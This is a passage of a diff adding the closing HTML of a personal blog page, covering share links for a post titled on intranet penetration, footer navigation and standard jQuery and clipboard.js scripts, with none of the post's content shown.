+  <li><a class="icon" href="mailto:?subject=内网穿透 | xiaodisec&body=Check out this article: https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&title=内网穿透 | xiaodisec"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&title=内网穿透 | xiaodisec"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&title=内网穿透 | xiaodisec"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&title=内网穿透 | xiaodisec"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&name=内网穿透 | xiaodisec&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&t=内网穿透 | xiaodisec"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    killeveee
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
